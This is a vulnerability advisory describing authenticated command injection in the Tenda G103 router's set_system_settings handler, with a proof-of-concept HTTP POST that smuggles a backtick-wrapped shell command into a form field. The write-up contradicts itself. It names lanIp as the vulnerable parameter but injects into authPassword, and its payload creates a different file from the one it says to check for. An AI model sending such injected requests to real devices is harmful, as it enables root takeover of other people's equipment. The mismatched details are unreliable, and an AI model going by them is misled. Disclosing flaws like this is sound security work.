# Tenda G103 Command Injection Vulnerability in `lanIp` Parameter of `action_set_system_settings` (system.lua)

## Overview

A command injection vulnerability exists in the `action_set_system_settings` function of the `system.lua` file in Tenda G103 GPON optical network terminals. The vulnerability arises due to improper sanitization of the `lanIp` parameter, which is directly concatenated into system commands without validation. Authenticated attackers can exploit this to execute arbitrary system commands with root privileges, leading to full device compromise.

## Details



*   **Vendor**: Tenda

*   **Product**: G103_V1.0.0.5

*   **Firmware Version**: US\_G103V1.0la\_V1.0.0.5\_TDC01

*   **Firmware Download**: https://tenda.com.cn/material/show/2615

*   **Affected Component**: `system.lua` (LuCI controller)

*   **Affected Function**: `action_set_system_settings`

*   **Affected Parameter**: `lanIp`

*   **Vulnerability Type**: Command Injection

*   **Impact**: Arbitrary command execution, sensitive data leakage, device configuration tampering, or complete takeover

## Vulnerability Analysis

The `action_set_system_settings` function handles the `lanIp` parameter (used to configure the LAN interface IP address). The parameter is directly passed to system commands such as `ifconfig`, `fw_setenv`, and `uci` without sanitization or validation.

Key vulnerable code in `system.lua`:

(./imgs/0.png)

Attackers can inject arbitrary commands by including shell metacharacters (e.g., backticks `` ` ``, semicolons `;`, or `&&`) in the `lanIp` parameter. These characters are not filtered, allowing the injected commands to be parsed and executed by the system shell.

## Proof of Concept (PoC)

### Execute `touch` to Create a Test File



```
POST /cgi-bin/luci/;stok=c64c61744085716b924f3c034266e7c1/admin/system/set_system_settings HTTP/1.1
Host: 192.168.0.1
Content-Length: 40
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.1/cgi-bin/luci/;stok=c64c61744085716b924f3c034266e7c1/admin/system/
Accept-Encoding: gzip, deflate, br
Cookie: isLogin=true; isLogin=true; sysauth=ca14c877a3df6cdc740bf4bbef3f02c1; sysauth=; repeatTimes=0; isLogin=true
Connection: keep-alive
 
authPassword=1`touch$IFS/tmp/setting.txt`
```

#### Execution Steps:

1.  Send the above POST request with a valid `stok` (session token) and authentication cookies.

2.  Access the device (via CLI or another injected command) and verify the existence of `/tmp/lanip_inject.txt`.

#### Expected Result:

The file `/tmp/lanip_inject.txt` is created, confirming successful execution of the injected `touch` command.

(./imgs/1.png)
(./imgs/2.png)
